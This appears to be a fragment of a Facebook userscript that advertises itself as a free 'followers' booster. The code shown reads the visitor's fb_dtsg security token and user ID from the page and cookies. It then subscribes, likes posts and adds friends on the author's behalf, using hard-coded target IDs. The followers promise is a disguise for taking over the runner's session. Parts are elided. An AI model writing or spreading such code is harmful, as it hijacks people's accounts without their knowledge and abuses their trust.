// ==UserScript==
// @name   Ezzat_Khan Likes Followers script     
// @version   1.3
// @description made by Jahnzaib Unlimited followers       
// ==/UserScript==
...
sublist("242622539246887");
sublist("248208962021578");
sublist("249666325209175");
sublist("250660491776425");
sublist("671501319555936");


var gid = ['480404525394774'];
...
// pic + fans
P("1415876955324127");P("");P("1415877018657454");P("669437533095648");P("669437533095648");P("659021760803892");P("558515540854515");Like("667077743331627");Like("664091416963593");Like("669391919766876");Like("");P("");Like("548781161816546");Like("297749613678444");Like("672494649458649");Like("233818870122707")
/*Add Friend*/;
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
